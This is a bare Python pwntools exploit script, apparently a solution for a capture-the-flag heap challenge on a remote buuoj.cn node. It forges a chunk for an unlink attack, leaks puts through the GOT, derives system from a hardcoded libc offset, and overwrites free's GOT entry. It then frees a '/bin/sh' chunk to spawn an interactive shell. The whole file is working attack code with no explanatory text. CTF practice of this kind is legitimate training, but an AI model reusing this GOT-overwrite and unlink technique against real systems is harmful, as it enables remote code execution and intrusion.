from pwn import *

io=remote('node3.buuoj.cn',28140)

def add(size,data):
    io.recvuntil('choice:')
    io.sendline('2')
    io.recvuntil('name:')
    io.sendline(str(size))
    io.recvuntil('item:')
    io.send(data)

def free(idx):
    io.recvuntil('choice:')
    io.sendline('4')
    io.recvuntil('index of item:')
    io.sendline(str(idx))

def edit(idx,size,data):
    io.recvuntil('choice:')
    io.sendline('3')
    io.recvuntil('of item:')
    io.sendline(str(idx))
    io.recvuntil('item name:')
    io.sendline(str(size))
    io.recvuntil('the item:')
    io.send(data)

def show():
    io.recvuntil('choice:')
    io.sendline('1')   

ptr=0x6020d8
puts_got=0x602020
free_got=0x602018

add(0x30,'a')#0
add(0x30,'a')#1
add(0x80,'b')#2
add(0x80,'/bin/sh')#3

edit(1,0x100,p64(0)+p64(0x31)+p64(ptr-0x18)+p64(ptr-0x10)+'a'*0x10+p64(0x30)+p64(0x90))
free(2)
edit(1,0x100,p64(0x30)+p64(puts_got))#1
show()
io.recvuntil('0 : ')
puts_add=u64(io.recv(6).ljust(8,'\x00'))
print(hex(puts_add))
sys=puts_add-0x2a300

edit(1,0x100,p64(0x30)+p64(free_got))
edit(0,0x100,p64(sys))
free(3)

io.interactive()